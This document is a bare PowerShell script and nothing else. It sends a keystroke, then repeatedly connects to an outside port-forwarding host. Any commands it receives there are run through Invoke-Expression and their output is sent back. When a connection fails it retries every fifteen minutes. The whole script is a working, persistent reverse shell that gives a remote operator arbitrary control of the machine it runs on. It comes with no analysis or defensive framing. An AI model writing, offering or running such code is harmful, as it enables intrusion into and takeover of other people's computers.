Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait('^g')

while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient('secure-system-testing-34021.portmap.host', 39834)
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true

        while ($client.Connected) {
            $command = $reader.ReadLine()
            if ($command -eq 'exit') { break }
            try {
                $result = Invoke-Expression $command 2>&1 | Out-String
            } catch {
                $result = $_.Exception.Message
            }
            $writer.WriteLine($result)
        }
        $client.Close()
    } catch {
        Write-Host 'Connection failed. Retrying in 15 minutes...'
        Start-Sleep -Seconds 900
    }
}
